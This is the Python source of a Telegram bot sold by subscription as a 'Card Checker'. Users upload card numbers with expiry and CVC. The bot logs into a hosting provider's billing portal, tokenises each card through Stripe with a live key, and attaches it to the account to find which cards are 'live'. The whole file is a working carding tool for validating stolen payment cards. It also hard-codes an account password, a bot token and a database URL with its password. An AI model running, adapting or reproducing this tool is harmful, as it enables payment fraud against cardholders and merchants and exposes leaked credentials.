import requests
import uuid
import telebot
import psycopg2
import threading
import time
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==============================
# LOGIN CREDENTIALS
EMAIL = "vefyonokna@necub.com"
PASSWORD = "111222333"

# BOT TOKEN
TOKEN = "8464532615:AAEulVRmRS3k5ls8Gi-MDFQlD7DH4Q8HerY"
bot = telebot.TeleBot(TOKEN)

# DATABASE CONFIG
DATABASE_URL = "postgresql://postgres:QkafGfThmWUvSzvkXNvJToBBUVtPQQSV@postgres.railway.internal:5432/railway"

# ADMIN IDS (Add your admin IDs here)
ADMIN_IDS = [5895491379]  # Your ID

# CONTACT INFO
CONTACT_INFO = {
    'name': 'Mahmoud Saad 🥷🏻',
    'username': '@FastSpeedtest',
    'id': 5895491379
}

# ==============================
# DATABASE FUNCTIONS
def init_db():
    """Initialize database tables"""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    
    # Users table
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id BIGINT PRIMARY KEY,
            username VARCHAR(255),
            first_name VARCHAR(255),
            subscription_end TIMESTAMP,
            is_active BOOLEAN DEFAULT TRUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Admins table
    cur.execute('''
        CREATE TABLE IF NOT EXISTS admins (
            user_id BIGINT PRIMARY KEY,
            username VARCHAR(255),
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Settings table
    cur.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key VARCHAR(255) PRIMARY KEY,
            value VARCHAR(255)
        )
    ''')
    
    # Insert default settings
    cur.execute('''
        INSERT INTO settings (key, value) VALUES ('subscription_required', 'true')
        ON CONFLICT (key) DO NOTHING
    ''')
    
    # Insert default admin
    cur.execute('''
        INSERT INTO admins (user_id, username) VALUES (%s, %s)
        ON CONFLICT (user_id) DO NOTHING
    ''', (ADMIN_IDS[0], CONTACT_INFO['username']))
    
    conn.commit()
    cur.close()
    conn.close()

def get_user_subscription(user_id):
    """Get user subscription info"""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('SELECT subscription_end FROM users WHERE user_id = %s', (user_id,))
    result = cur.fetchone()
    cur.close()
    conn.close()
    return result[0] if result else None

def add_user(user_id, username, first_name):
    """Add new user to database"""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('''
        INSERT INTO users (user_id, username, first_name)
        VALUES (%s, %s, %s)
        ON CONFLICT (user_id) DO UPDATE SET
        username = EXCLUDED.username,
        first_name = EXCLUDED.first_name
    ''', (user_id, username, first_name))
    conn.commit()
    cur.close()
    conn.close()

def update_subscription(user_id, hours=0, days=0):
    """Update user subscription"""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    
    new_end = datetime.now() + timedelta(hours=hours, days=days)
    
    cur.execute('''
        UPDATE users SET subscription_end = %s WHERE user_id = %s
    ''', (new_end, user_id))
    conn.commit()
    cur.close()
    conn.close()

def is_admin(user_id):
    """Check if user is admin"""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('SELECT user_id FROM admins WHERE user_id = %s', (user_id,))
    result = cur.fetchone()
    cur.close()
    conn.close()
    return result is not None

def add_admin(user_id, username):
    """Add new admin"""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('''
        INSERT INTO admins (user_id, username) VALUES (%s, %s)
        ON CONFLICT (user_id) DO NOTHING
    ''', (user_id, username))
    conn.commit()
    cur.close()
    conn.close()

def remove_admin(user_id):
    """Remove admin"""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('DELETE FROM admins WHERE user_id = %s', (user_id,))
    conn.commit()
    cur.close()
    conn.close()

def get_all_admins():
    """Get all admins"""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('SELECT user_id, username FROM admins')
    result = cur.fetchall()
    cur.close()
    conn.close()
    return result

def is_subscription_required():
    """Check if subscription is required"""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    cur.execute('SELECT value FROM settings WHERE key = %s', ('subscription_required',))
    result = cur.fetchone()
    cur.close()
    conn.close()
    return result[0] == 'true' if result else True

def toggle_subscription_system():
    """Toggle subscription system on/off"""
    conn = psycopg2.connect(DATABASE_URL)
    cur = conn.cursor()
    
    current = is_subscription_required()
    new_value = 'false' if current else 'true'
    
    cur.execute('''
        UPDATE settings SET value = %s WHERE key = %s
    ''', (new_value, 'subscription_required'))
    conn.commit()
    cur.close()
    conn.close()
    return not current

# ==============================
# Stripe headers
stripe_headers = {
    "accept": "application/json",
    "accept-language": "en-US",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
}

# BudgetVM headers
budget_headers = {
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://portal.budgetvm.com",
    "Referer": "https://portal.budgetvm.com/MyAccount/MyBilling",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "X-Requested-With": "XMLHttpRequest",
}

# ==============================
# DATA STORAGE
user_cards, stats, messages, stop_flag = {}, {}, {}, {}

# ==============================
# SUBSCRIPTION CHECKER
def check_subscription(user_id):
    """Check if user has active subscription"""
    if not is_subscription_required():
        return True
        
    if is_admin(user_id):
        return True
        
    sub_end = get_user_subscription(user_id)
    if sub_end and sub_end > datetime.now():
        return True
    return False

# ==============================
# DASHBOARD FUNCTIONS
def generate_dashboard(chat_id):
    s = stats.get(chat_id)
    if not s:
        return "⚠️ No data available."

    msg = "📊 **CARD CHECKER RESULTS**\n\n"
    if s['visa_checked']:
        msg += f"🔄 **Current:** `{s['visa_checked']}`\n"
        msg += f"📝 **Status:** {s['response']}\n\n"
    else:
        msg += f"📝 **Status:** {s['response']}\n\n"

    msg += "━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    if s["lives"]:
        msg += "💳 **Live Cards:**\n"
        for card in s["lives"]:
            msg += f"`{card}`\n"
            
    return msg

def generate_buttons(chat_id):
    s = stats.get(chat_id, {"approved":0,"declined":0,"cvv":0,"ccn":0,"total":0})
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"✅ Approved: {s['approved']}", callback_data="show_approved"),
        InlineKeyboardButton(f"❌ Declined: {s['declined']}", callback_data="show_declined"),
    )
    markup.add(
        InlineKeyboardButton(f"⚠️ CVV Error: {s['cvv']}", callback_data="show_cvv"),
        InlineKeyboardButton(f"⛔ Blocked: {s['ccn']}", callback_data="show_ccn"),
    )
    markup.add(
        InlineKeyboardButton(f"📊 Total: {s['total']}", callback_data="show_total")
    )
    markup.add(
        InlineKeyboardButton("⏹️ Stop Check", callback_data="stop_check")
    )
    return markup

def generate_admin_panel():
    """Generate admin panel buttons"""
    markup = InlineKeyboardMarkup(row_width=2)
    
    sub_status = "ON" if is_subscription_required() else "OFF"
    markup.add(
        InlineKeyboardButton(f"🔄 Subscription: {sub_status}", callback_data="toggle_subscription")
    )
    markup.add(
        InlineKeyboardButton("👑 Manage Admins", callback_data="manage_admins"),
        InlineKeyboardButton("💎 Add Subscription", callback_data="add_subscription")
    )
    markup.add(
        InlineKeyboardButton("📊 Statistics", callback_data="show_stats"),
        InlineKeyboardButton("👥 All Users", callback_data="show_users")
    )
    return markup

def generate_subscription_panel():
    """Generate subscription management panel"""
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("⏰ 1 Hour", callback_data="sub_1h"),
        InlineKeyboardButton("⏰ 3 Hours", callback_data="sub_3h")
    )
    markup.add(
        InlineKeyboardButton("⏰ 6 Hours", callback_data="sub_6h"),
        InlineKeyboardButton("⏰ 12 Hours", callback_data="sub_12h")
    )
    markup.add(
        InlineKeyboardButton("📅 1 Day", callback_data="sub_1d"),
        InlineKeyboardButton("📅 3 Days", callback_data="sub_3d")
    )
    markup.add(
        InlineKeyboardButton("📅 7 Days", callback_data="sub_7d"),
        InlineKeyboardButton("📅 30 Days", callback_data="sub_30d")
    )
    markup.add(
        InlineKeyboardButton("🔙 Back", callback_data="admin_panel")
    )
    return markup

# ==============================
# CARD CHECKING FUNCTION
def run_check(chat_id):
    cards = user_cards.get(chat_id, [])
    s = {"visa_checked":"","approved":0,"declined":0,"unknown":0,"total":0,"response":"",
         "lives":[],"cvv":0,"ccn":0}
    stop_flag[chat_id] = False
    stats[chat_id] = s

    session = requests.Session()

    # Login
    login_data = {"email": EMAIL, "password": PASSWORD}
    session.post("https://portal.budgetvm.com/auth/login", data=login_data)

    # GoogleAsk
    google_data = {
        "gEmail": EMAIL,
        "gUniqueask": "client",
        "setup": "2",
        "email": EMAIL,
        "gUnique": "client"
    }
    session.post("https://portal.budgetvm.com/auth/googleAsk", data=google_data)

    if "ePortalv1" not in session.cookies.get_dict():
        s["response"] = "❌ Login/GoogleAsk failed"
        stats[chat_id] = s
        return

    # Check cards
    for card in cards:
        if stop_flag.get(chat_id):
            s["response"] = "⏹️ Check stopped"
            stats[chat_id] = s
            break

        s["total"] += 1
        s["visa_checked"] = card

        try:
            card_number, exp_month, exp_year, cvc = card.split("|")
        except:
            s["cvv"] += 1
            s["response"] = "❌ Invalid card format"
            continue

        # Stripe Token
        muid, sid, guid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
        stripe_data = (
            f"time_on_page=10000&guid={guid}&muid={muid}&sid={sid}"
            f"&key=pk_live_7sv0O1D5LasgJtbYpxp9aUbX&payment_user_agent=stripe.js"
            f"&card[number]={card_number}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&card[cvc]={cvc}"
        )

        stripe_response = session.post("https://api.stripe.com/v1/tokens", headers=stripe_headers, data=stripe_data)
        resp_json = stripe_response.json()

        if "id" not in resp_json:
            s["cvv"] += 1
            s["response"] = "❌ Token creation failed"
        else:
            token_id = resp_json["id"]
            card_response = session.post(
                "https://portal.budgetvm.com/MyGateway/Stripe/cardAdd",
                headers=budget_headers,
                cookies=session.cookies.get_dict(),
                data={"stripeToken": token_id}
            )
            try:
                resp_json = card_response.json()
            except:
                s["unknown"] += 1
                s["response"] = "❓ Unknown response"
                continue

            result = str(resp_json.get("result",""))
            if resp_json.get("success") is True:
                s["approved"] += 1
                s["response"] = f"✅ {result}"
                s["lives"].append(card)
            elif "does not support" in result.lower() or "blocked" in result.lower():
                s["ccn"] += 1
                s["response"] = f"⛔ {result}"
            elif "declined" in result.lower():
                s["declined"] += 1
                s["response"] = f"❌ {result}"
            else:
                s["unknown"] += 1
                s["response"] = f"❓ {result}"

        stats[chat_id] = s

        # Update message
        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=messages[chat_id],
                text=generate_dashboard(chat_id),
                parse_mode="Markdown",
                reply_markup=generate_buttons(chat_id)
            )
        except Exception as e:
            print("Edit error:", e)

# ==============================
# BOT COMMANDS
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    # Add user to database
    add_user(user_id, username, first_name)
    
    if not check_subscription(user_id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
        
        bot.send_message(
            message.chat.id, 
            f"🚫 **Access Denied**\n\n"
            f"❌ You don't have an active subscription!\n\n"
            f"👤 **Your ID:** `{user_id}`\n"
            f"👑 **Contact Admin:** {CONTACT_INFO['name']}\n"
            f"📱 **Username:** {CONTACT_INFO['username']}\n"
            f"🆔 **Admin ID:** `{CONTACT_INFO['id']}`\n\n"
            f"📞 Click the button below to contact admin for subscription!",
            parse_mode="Markdown",
            reply_markup=markup
        )
        return
    
    if is_admin(user_id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel"))
        bot.send_message(
            message.chat.id, 
            "👋 **Welcome Admin!**\n\n"
            "🚀 **Card Checker Bot**\n"
            "💳 Use /check to start checking cards\n"
            "👑 Use Admin Panel for management\n\n"
            "📝 **Commands:**\n"
            "• `/check` - Start card checking\n"
            "• `/admin` - Admin panel",
            parse_mode="Markdown",
            reply_markup=markup
        )
    else:
        sub_end = get_user_subscription(user_id)
        sub_text = f"📅 **Expires:** {sub_end.strftime('%Y-%m-%d %H:%M UTC')}" if sub_end else "♾️ **Unlimited**"
        
        bot.send_message(
            message.chat.id, 
            f"👋 **Welcome!**\n\n"
            f"🚀 **Card Checker Bot**\n"
            f"✅ **Subscription Status:** Active\n"
            f"{sub_text}\n\n"
            f"📝 **Commands:**\n"
            f"• `/check` - Start card checking\n\n"
            f"💳 Ready to check your cards!",
            parse_mode="Markdown"
        )

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(message.chat.id, "🚫 Access denied! Admin only.")
        return
    
    bot.send_message(
        message.chat.id,
        "👑 **Admin Panel**\n\n"
        "🔧 **System Management:**\n"
        "• Toggle subscription system\n"
        "• Manage administrators\n"
        "• Add subscriptions to users\n"
        "• View statistics\n\n"
        "📊 Choose an option below:",
        parse_mode="Markdown",
        reply_markup=generate_admin_panel()
    )

@bot.message_handler(commands=['check'])
def ask_for_cards(message):
    user_id = message.from_user.id
    
    if not check_subscription(user_id):
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{CONTACT_INFO['username']}"))
        
        bot.send_message(
            message.chat.id, 
            f"🚫 **Subscription Required**\n\n"
            f"❌ You need an active subscription to use this service!\n\n"
            f"👤 **Your ID:** `{user_id}`\n"
            f"📞 Contact admin for subscription:",
            parse_mode="Markdown",
            reply_markup=markup
        )
        return
    
    bot.send_message(
        message.chat.id, 
        "💳 **Send your cards now!**\n\n"
        "📝 **Format:** `4111111111111111|12|2025|123`\n\n"
        "📄 **Options:**\n"
        "• Send as text (one per line)\n"
        "• Upload .txt file\n\n"
        "⚡ Ready to check your cards!",
        parse_mode="Markdown"
    )

# File handler
@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    
    if not check_subscription(user_id):
        bot.reply_to(message, "🚫 Subscription required!")
        return
        
    if not message.document.file_name.endswith(".txt"):
        bot.reply_to(message, "⚠️ Please send a .txt file only.")
        return
        
    file_info = bot.get_file(message.document.file_id)
    file_content = bot.download_file(file_info.file_path).decode("utf-8")
    cards = [line.strip() for line in file_content.splitlines() if "|" in line]
    
    if not cards:
        bot.reply_to(message, "❌ No valid cards found in file!")
        return
    
    user_cards[message.chat.id] = cards
    s = {"approved":0,"declined":0,"unknown":0,"total":0,"response":"🔄 Starting check...","lives":[],"cvv":0,"ccn":0,"visa_checked":""}
    stats[message.chat.id] = s
    
    msg = bot.send_message(
        message.chat.id, 
        generate_dashboard(message.chat.id), 
        parse_mode="Markdown", 
        reply_markup=generate_buttons(message.chat.id)
    )
    messages[message.chat.id] = msg.message_id
    
    # Start checking in thread
    threading.Thread(target=run_check, args=(message.chat.id,)).start()

# Text handler
@bot.message_handler(func=lambda m: "|" in m.text)
def handle_cards_text(message):
    user_id = message.from_user.id
    
    if not check_subscription(user_id):
        bot.reply_to(message, "🚫 Subscription required!")
        return
        
    cards = [line.strip() for line in message.text.splitlines() if "|" in line]
    
    if not cards:
        bot.reply_to(message, "❌ No valid cards found!")
        return
        
    user_cards[message.chat.id] = cards
    s = {"approved":0,"declined":0,"unknown":0,"total":0,"response":"🔄 Starting check...","lives":[],"cvv":0,"ccn":0,"visa_checked":""}
    stats[message.chat.id] = s
    
    msg = bot.send_message(
        message.chat.id, 
        generate_dashboard(message.chat.id), 
        parse_mode="Markdown", 
        reply_markup=generate_buttons(message.chat.id)
    )
    messages[message.chat.id] = msg.message_id
    
    # Start checking in thread
    threading.Thread(target=run_check, args=(message.chat.id,)).start()

# Admin commands for subscription management
@bot.message_handler(func=lambda m: m.text and m.text.startswith('/addsub') and is_admin(m.from_user.id))
def add_sub_command(message):
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "📝 **Usage:** `/addsub [user_id] [hours/days]`\n\n**Examples:**\n• `/addsub 123456789 24h`\n• `/addsub 123456789 7d`")
            return
            
        user_id = int(parts[1])
        duration = parts[2]
        
        if duration.endswith('h'):
            hours = int(duration[:-1])
            update_subscription(user_id, hours=hours)
            bot.reply_to(message, f"✅ Added {hours} hours subscription to user {user_id}")
        elif duration.endswith('d'):
            days = int(duration[:-1])
            update_subscription(user_id, days=days)
            bot.reply_to(message, f"✅ Added {days} days subscription to user {user_id}")
        else:
            bot.reply_to(message, "❌ Invalid format! Use 'h' for hours or 'd' for days.")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Callback handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    
    # Card checking callbacks
    if call.data == "stop_check":
        stop_flag[call.message.chat.id] = True
        bot.answer_callback_query(call.id, "⏹️ Check stopped")
        return
    elif call.data in ["show_approved", "show_declined", "show_cvv", "show_ccn", "show_total"]:
        bot.answer_callback_query(call.id, "ℹ️ Statistical information")
        return
    
    # Admin only callbacks
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "🚫 Admin only!")
        return
    
    if call.data == "admin_panel":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="👑 **Admin Panel**\n\n🔧 Choose an option:",
            parse_mode="Markdown",
            reply_markup=generate_admin_panel()
        )
    
    elif call.data == "toggle_subscription":
        new_status = toggle_subscription_system()
        status_text = "ON" if new_status else "OFF"
        bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=generate_admin_panel()
        )
        bot.answer_callback_query(call.id, f"🔄 Subscription system: {status_text}")
    
    elif call.data == "add_subscription":
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="💎 **Add Subscription**\n\n⚠️ Forward a message from the user or send their ID, then select duration:",
            parse_mode="Markdown",
            reply_markup=generate_subscription_panel()
        )
        # Set waiting state for user ID input
        # This would need additional state management
    
    # Subscription duration callbacks
    elif call.data.startswith("sub_"):
        duration = call.data[4:]
        bot.answer_callback_query(call.id, f"📝 Send user ID to add {duration} subscription")
        # This would need additional implementation for user ID input

# Initialize database
init_db()

print("🤖 Bot is running with subscription system...")
bot.infinity_polling()
